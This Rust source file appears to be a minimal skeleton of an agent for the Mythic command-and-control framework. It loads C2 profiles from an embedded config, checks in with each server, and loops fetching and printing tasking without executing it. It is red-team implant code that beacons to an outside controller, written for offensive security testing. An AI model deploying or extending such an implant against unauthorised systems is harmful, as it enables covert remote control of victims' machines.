use mythic::{MythicAgent, MythicC2};
use serde::{Deserialize, Serialize};
#[derive(Debug, Serialize, Deserialize)]
struct Config {
    payload_uuid: String,
    c2_profiles: Vec<MythicC2>,
}

fn main() {
    let (agent, c2_list) = checkin();
    task_loop(agent, c2_list);
}

fn checkin() -> (MythicAgent, Vec<MythicC2>) {
    let (payload_uuid, mut c2_list) = {
        let config: Config = serde_json::from_str(include_str!("../config.json")).unwrap();
        (config.payload_uuid, config.c2_profiles)
    };
    let mut agent = MythicAgent::new(payload_uuid);
    for c2 in &mut c2_list {
        let resp = agent.checkin(
            c2,
            vec![],
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
        );
        println!("{:?}", &resp);
        agent.callback_uuid = match resp {
            Ok(resp) => resp.id,
            Err(e) => {
                println!("[-] checkin error: {:?}", e);
                continue;
            }
        }
    }
    (agent, c2_list)
}

fn task_loop(agent: MythicAgent, c2_list: Vec<MythicC2>) {
    let mut c2_list = c2_list;
    let mut flag = 0;
    loop {
        flag = flag + 1;
        println!("[+] Loop Count: {flag}");
        loop_sleep(5);
        if flag == 0 {
            break;
        }
        for c2 in &mut c2_list {
            let tasks = match agent.get_tasking(c2, -1) {
                Ok(tasks) => tasks,
                Err(e) => {
                    println!("[-] get tasksing error: {:?}", e);
                    continue;
                }
            };
            dbg!(tasks);
            break;
        }
    }
}

fn loop_sleep(time: u64) {
    std::thread::sleep(std::time::Duration::from_secs(time));
}
